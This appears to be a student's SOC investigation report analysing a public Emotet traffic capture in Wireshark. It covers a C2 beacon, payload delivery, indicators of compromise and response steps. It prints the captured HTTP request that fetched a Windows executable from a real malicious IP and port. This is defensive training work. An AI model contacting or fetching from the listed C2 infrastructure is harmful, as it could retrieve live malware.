# Investigation 01 — Emotet C2 Traffic Analysis

| Field | Details |
|---|---|
| **Date Analysed** | [Today's date] |
| **PCAP Date** | January 28, 2019 |
| **Analyst** | Musfira Zafar |
| **Source** | malware-traffic-analysis.net |
| **Malware Family** | Emotet (dropper) |
| **Severity** | 🔴 Critical |
| **Verdict** | CONFIRMED MALICIOUS |

---

## 🎯 Objective

Analyse a real-world malicious PCAP file to identify C2 (Command & Control) communication, extract all indicators of compromise, and produce a structured incident report as a SOC analyst would.

---

## 🛠️ Tools Used

| Tool | Version | Purpose |
|---|---|---|
| Wireshark | Latest stable | PCAP analysis, filtering, TCP stream inspection |
| VirusTotal | Web (free) | IOC reputation verification |
| malware-traffic-analysis.net | — | Source of exercise PCAP |

---

## 🖥️ Environment

- **OS:** Windows (host machine)
- **Analysis type:** Static PCAP analysis (no malware executed)
- **PCAP file:** `2019-01-28-traffic-analysis-exercise.pcap`

---

## 📸 Evidence — Screenshot Walkthrough

### Screenshot 1 — PCAP loaded in Wireshark
`screenshots/01-wireshark-open.png`

**What it shows:** The PCAP file opened successfully. First packets are NBNS registrations and DNS queries from `172.17.8.109` to the internal domain `timbershade.info`.

**Key observation:** The infected machine is identified as `172.17.8.109` with hostname `DUNN-WINDOWS-PC`. All early traffic is internal — the machine is joining the domain before calling home.

---

### Screenshot 2 — Protocol Hierarchy
`screenshots/02-protocol-hierarchy.png`

**What it shows:** Statistics → Protocol Hierarchy breakdown of all 3,690 packets.

**Key finding:**
```
Transport Layer Security (TLS) = 76.9% of all bytes
HTTP (unencrypted)             =  6.5% of data bytes
```

**Why it matters:** Normal Windows network traffic is not 77% encrypted. This abnormally high TLS percentage is a strong indicator that malware is hiding C2 communication inside encrypted HTTPS — a common evasion technique.

---

### Screenshot 3 — HTTP Request Filter
`screenshots/03-http-request-filter.png`

**Filter applied:** `http.request`

**What it shows:** Only 3 HTTP GET requests exist in the entire capture. Two are legitimate Windows connectivity checks. The third is the C2 beacon:

```
Packet 802 — GET /91msE95B/activV.bin → 91.121.30.169:8000
```

**Red flags identified:**
- Random-looking URI path (`/91msE95B/activV.bin`)
- Non-standard port 8000 (not the usual 80)
- External IP address not associated with any known legitimate service
- `.bin` file extension — binary file download

---

### Screenshot 4 — DNS Filter
`screenshots/04-dns-filter.png`

**Filter applied:** `dns`

**What it shows:** All DNS queries in the capture resolve only to `timbershade.info` — the internal Active Directory domain. No external domain was queried for the C2 server.

**Key observation:** The malware communicated with its C2 server using a direct IP address (`91.121.30.169`) rather than a domain name. This is a deliberate **DNS evasion technique** — it bypasses DNS-based detection tools and domain blacklists.

---

### Screenshot 5 — TCP Stream (Payload Delivery)
`screenshots/05-tcp-stream-payload.png`

**Action:** Right-click packet 802 → Follow → TCP Stream

**This is the smoking gun.**

**Red (sent by infected machine):**
```
GET /91msE95B/activV.bin HTTP/1.1
Host: 91.121.30.169:8000
Connection: Keep-Alive
```

**Blue (response from C2 server):**
```
HTTP/1.1 200 OK
Server: nginx/1.0.15
Content-Type: application/octet-stream
Content-Length: 155648

MZ............This program cannot be run in DOS mode.
```

**What `MZ` means:** Every Windows executable file begins with the bytes `4D 5A` — displayed as `MZ`. This is the PE (Portable Executable) file header magic bytes. The C2 server delivered a **155KB Windows malware binary** directly to the victim machine over plain HTTP.

---

### Screenshot 6 — VirusTotal Confirmation
`screenshots/06-virustotal-confirmation.png`

**IOC checked:** `91.121.30.169`

**Result:**
- **Gridinsoft:** 🔴 Malicious
- **ESET:** 🟡 Suspicious
- **ASN:** AS16276 — OVH SAS, France
- **Detection:** 1/91 vendors (low count expected — older C2 IPs age out of databases)

**Conclusion:** Independent third-party confirmation that the IP is malicious infrastructure. OVH is a legitimate cloud hosting provider frequently abused by threat actors due to its affordable pricing and permissive policies.

---

## 🔎 Full Investigation Methodology

**Step 1 — Protocol Hierarchy (get bearings)**

Before filtering anything, opened Statistics → Protocol Hierarchy to understand the composition of the capture. TLS at 76.9% of bytes was the first anomaly — flagged for follow-up.

**Step 2 — HTTP filter (find unencrypted C2)**

Applied `http.request`. Despite the heavy TLS usage, the malware made one unencrypted HTTP request — likely to download its second-stage payload before switching to encrypted comms. Packet 802 contained the C2 beacon.

**Step 3 — DNS filter (check for domain-based C2)**

Applied `dns` to check if the malware resolved any external domains. All DNS was internal. Confirmed the malware used direct IP for C2 — a DNS evasion technique.

**Step 4 — Follow TCP stream on packet 802**

Right-clicked the suspicious packet → Follow → TCP Stream. The full conversation was visible in plaintext. C2 server responded with `application/octet-stream` and a payload beginning with `MZ` — a Windows PE executable.

**Step 5 — IOC verification on VirusTotal**

Searched the C2 IP on VirusTotal. Confirmed malicious with detections from Gridinsoft and flagged suspicious by ESET.

---

## 🚨 Indicators of Compromise (IOCs)

```
========================================
VICTIM
========================================
IP Address : 172.17.8.109
Hostname   : DUNN-WINDOWS-PC
Domain     : timbershade.info (internal AD domain)

========================================
C2 INFRASTRUCTURE
========================================
IP Address : 91.121.30.169
Port       : 8000
Protocol   : HTTP
URI        : /91msE95B/activV.bin
ASN        : AS16276
Provider   : OVH SAS
Country    : France (FR)

========================================
PAYLOAD
========================================
File type  : Windows PE Executable (MZ header)
Size       : 155,648 bytes
Delivery   : HTTP GET response (application/octet-stream)
Timestamp  : 2019-01-28 21:49:19 UTC
Malware    : Emotet (second-stage dropper payload)
```

---

## ✅ Analyst Verdict

**CONFIRMED — Emotet dropper second-stage payload delivery.**

The host `DUNN-WINDOWS-PC` (`172.17.8.109`) was infected with Emotet. The malware established C2 communication with `91.121.30.169` on port 8000 and successfully downloaded a 155KB Windows executable payload via plain HTTP. The C2 server used a direct IP address to evade DNS-based detection controls. The payload was delivered as `application/octet-stream` — a binary file that begins with the Windows PE magic bytes `MZ`, confirming it is a Windows executable (likely a second-stage loader or banking trojan module).

---

## 📋 Recommended Response Actions

| Priority | Action |
|---|---|
| 🔴 Immediate | Isolate `172.17.8.109` from the network |
| 🔴 Immediate | Block `91.121.30.169` at the perimeter firewall and all endpoint firewalls |
| 🟠 High | Image the machine before any remediation — preserve forensic evidence |
| 🟠 High | Hunt all other endpoints for HTTP requests to port 8000 |
| 🟠 High | Search email logs for phishing emails — Emotet's primary delivery vector |
| 🟡 Medium | Check Active Directory for new accounts or privilege changes since infection |
| 🟡 Medium | Review all outbound TLS connections from `172.17.8.109` for additional C2 |
| 🟢 Low | Submit payload hash to threat intel platforms once extracted |

---

## 📚 What I Learned

- How to use Protocol Hierarchy to spot abnormal traffic composition
- What Emotet C2 traffic looks like in a real PCAP
- How to use `http.request`, `dns`, and stream filters in Wireshark effectively
- How to follow a TCP stream to read malware communication in plaintext
- What MZ / PE magic bytes mean and why they confirm a Windows executable
- How malware uses direct IPs to evade DNS-based detection (DNS evasion)
- How to verify IOCs on VirusTotal and interpret low detection counts
- How to write a structured SOC investigation report

---

*PCAP source: malware-traffic-analysis.net — public security training resource. No live malware was executed during this analysis.*
